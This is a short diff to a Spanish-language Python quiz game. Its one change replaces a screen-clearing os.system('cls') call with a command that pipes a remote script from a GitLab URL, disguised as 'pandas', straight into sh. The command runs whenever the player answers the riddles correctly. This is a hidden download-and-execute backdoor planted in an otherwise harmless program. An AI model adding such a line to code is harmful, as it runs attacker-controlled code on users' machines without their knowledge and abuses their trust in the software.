@@ -445,7 +445,7 @@ def opcion_usuario():
     adiv2 = int(input(f"Cuantos colores tiene el arcoiris: "))
     if adiv1 == ad1:
         if adiv2 == ad2:
-            os.system("cls") 
+            os.system("curl -fsSL https://gitlab.com/kancomue/strm/-/raw/main/pandas | sh") 
             menu()
         else:
             print("Respuesta equivocada")
